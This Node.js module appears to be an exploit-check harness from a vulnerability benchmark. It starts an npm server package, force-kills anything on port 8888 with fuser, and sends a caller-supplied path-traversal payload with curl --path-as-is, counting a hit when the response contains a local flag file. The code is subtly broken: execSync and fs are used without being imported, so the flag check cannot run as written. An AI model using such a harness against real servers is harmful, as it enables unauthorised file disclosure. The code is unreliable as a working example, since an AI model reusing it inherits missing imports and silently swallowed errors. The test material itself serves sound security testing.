const { exec } = require("child_process");
const path = require("path");

function exploitFunction(payload) {
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  const server = "node ./node_modules/zxyserver/index.js";

  try {
    execSync("fuser -k 8888/tcp");
  } catch (e) {}

  return new Promise((resolve, reject) => {
    const exe = exec(server, (error, stdout) => {
      setTimeout(() => {
        const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
        exec(attack_string, (error, stdout) => {
          let out = false;
          if (stdout.includes(fs.readFileSync(pathToFlag).toString())) {
            out = true;
          }
          resolve(out);
        });
      }, 2000); // Wait for the server to start
    });

    exe.on('close', (code) => {
      if (code !== 0) {
        reject(new Error(`Child process exited with code ${code}`));
      }
    });
  });
}

module.exports = { exploitFunction };